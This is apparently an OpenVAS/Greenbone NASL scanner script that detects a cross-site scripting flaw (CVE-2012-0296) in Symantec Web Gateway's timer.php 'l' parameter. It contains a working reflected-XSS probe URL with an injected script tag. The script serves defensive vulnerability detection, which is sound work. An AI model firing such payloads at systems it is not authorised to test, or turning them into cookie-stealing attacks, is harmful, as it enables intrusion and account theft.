CPE = "cpe:/a:symantec:web_gateway";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103484" );
	script_bugtraq_id( 53396 );
	script_version( "2020-10-20T15:03:35+0000" );
	script_cve_id( "CVE-2012-0296" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Symantec Web Gateway 'l' Parameter Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53396" );
	script_xref( name: "URL", value: "https://support.symantec.com/en_US/article.SYMSA1250.html" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2012-05-07 14:02:06 +0200 (Mon, 07 May 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_symantec_web_gateway_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "symantec_web_gateway/installed" );
	script_tag( name: "summary", value: "Symantec Web Gateway is prone to a cross-site scripting vulnerability
because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and launch other attacks." );
	script_tag( name: "solution", value: "Updates are available. Please see the referenced vendor advisory for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = NASLString( dir, "/spywall/timer.php?d=0&l=0'<script>alert(/xss-test/)</script>&profile=0" );
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(/xss-test/\\)</script>", check_header: TRUE )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

